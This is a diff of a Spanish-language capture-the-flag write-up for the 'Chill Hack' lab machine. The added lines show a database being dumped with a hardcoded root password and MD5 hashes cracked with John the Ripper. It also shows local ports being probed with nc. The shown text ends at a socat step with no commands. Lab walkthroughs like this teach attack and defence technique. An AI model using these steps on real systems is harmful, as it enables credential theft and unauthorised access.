@@ -195,10 +195,108 @@ Enunciado :
    
            $con = new PDO("mysql:dbname=webportal;host=localhost","root","!@m+her00+@db");
 
-    2) account.php -->  Vemos que la password la almacena como un hash(md5) y como hace la query para validar el login.
+       account.php -->  Vemos que la password la almacena como un hash(md5) y como hace la query para validar el login.
 
             $pw = hash("md5",$pw);
             $query = $this->con->prepare("SELECT * FROM users WHERE username='$un' AND password='$pw'");
+       
+          - Mostramos las conexiones activas y vemos que tiene un servicio Mysql corriendo localmente.
+      
+            ![image](https://github.com/Esevka/CTF/assets/139042999/31dcfd5c-861e-4948-9aa3-6f0910783ae6)
+
+          - Obtenemos credenciales de usuarios
+      
+                www-data@ubuntu:/var/www/files$ mysql -u root -p  webportal
+                Enter password: 
+                
+                mysql> show tables
+                    -> ;
+                +---------------------+
+                | Tables_in_webportal |
+                +---------------------+
+                | users               |
+                +---------------------+
+                1 row in set (0.00 sec)
+                
+                mysql> select * from users;
+                +----+-----------+----------+-----------+----------------------------------+
+                | id | firstname | lastname | username  | password                         |
+                +----+-----------+----------+-----------+----------------------------------+
+                |  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd |
+                |  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649 |
+                +----+-----------+----------+-----------+----------------------------------+
+            
+          - Crakeamos las passwords de los diferentes usuarios
+            
+                ---> Anurodh:masterpassword <---
+            
+                ┌──(root㉿kali)-[/home/…/ctf/try_ctf/chill_hack/contenido]
+                └─# echo '7e53614ced3640d5de23f111806cc4fd' > hash_users
+                                                                                                                                                                               
+                ┌──(root㉿kali)-[/home/…/ctf/try_ctf/chill_hack/contenido]
+                └─# john --wordlist=/usr/share/wordlists/rockyou.txt hash_users --format="RAW-MD5"
+                Using default input encoding: UTF-8
+                Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
+                Warning: no OpenMP support for this hash type, consider --fork=3
+                Press 'q' or Ctrl-C to abort, almost any other key for status
+                masterpassword   (?)     
+                1g 0:00:00:00 DONE (2023-12-08 09:47) 3.030g/s 17378Kp/s 17378Kc/s 17378KC/s masterrecherche..masterofdarklord
+                Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+                Session completed.
+
+                ---> Apaar:dontaskdonttell <---
+
+                ┌──(root㉿kali)-[/home/…/ctf/try_ctf/chill_hack/contenido]
+                └─# echo '686216240e5af30df0501e53c789a649' > hash_users
+                                                                                                                                                                               
+                ┌──(root㉿kali)-[/home/…/ctf/try_ctf/chill_hack/contenido]
+                └─# john --wordlist=/usr/share/wordlists/rockyou.txt hash_users --format="RAW-MD5"
+                Using default input encoding: UTF-8
+                Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
+                Warning: no OpenMP support for this hash type, consider --fork=3
+                Press 'q' or Ctrl-C to abort, almost any other key for status
+                dontaskdonttell  (?)     
+                1g 0:00:00:00 DONE (2023-12-08 09:49) 8.333g/s 15416Kp/s 15416Kc/s 15416KC/s dontspeak3..dontae24
+                Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+                Session completed. 
+
+          - Estas credenciales no son validas para cambiar de usuario desde la consola.
+       
+                www-data@ubuntu:/var/www/html/secret$ su apaar
+                Password: 
+                su: Authentication failure
+                www-data@ubuntu:/var/www/html/secret$ su anurodh
+                Password: 
+                su: Authentication failure
+
+          -  Cuando mostramos las conexiones activas habia otros puertos, los revisamos y vemos que esta corriendo un servicio http localmente.
+
+              ![image](https://github.com/Esevka/CTF/assets/139042999/52a4643a-072e-49b0-8112-1568c4e6a0f8)
+
+                  www-data@ubuntu:/var/www/html/secret$ nc -nv 127.0.0.1 9001
+                  Connection to 127.0.0.1 9001 port [tcp/*] succeeded!
+                  
+                  HTTP/1.1 400 Bad Request
+                  Date: Fri, 08 Dec 2023 09:08:40 GMT
+                  Server: Apache/2.4.29 (Ubuntu)
+                  Content-Length: 303
+                  Connection: close
+                  Content-Type: text/html; charset=iso-8859-1
+                  
+                  <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+                  <html><head>
+                  <title>400 Bad Request</title>
+                  </head><body>
+                  <h1>Bad Request</h1>
+                  <p>Your browser sent a request that this server could not understand.<br />
+                  </p>
+                  <hr>
+                  <address>Apache/2.4.29 (Ubuntu) Server at 127.0.1.1 Port 9001</address>
+                  </body></html>
+             
+          - redireccionamos el pueto con socat
+
+               
 
     3) hacker.php --> Encontramos estos dos mensajes que no sabemos muy bien a que se refieren.
 
@@ -211,7 +309,8 @@ Enunciado :
            -rw-r--r-- 1 root root   68841 Oct  3  2020 hacker-with-laptop_23-2147985341.jpg
 
 
-  - Directorio /home/apaar
+
+    
     
 
 
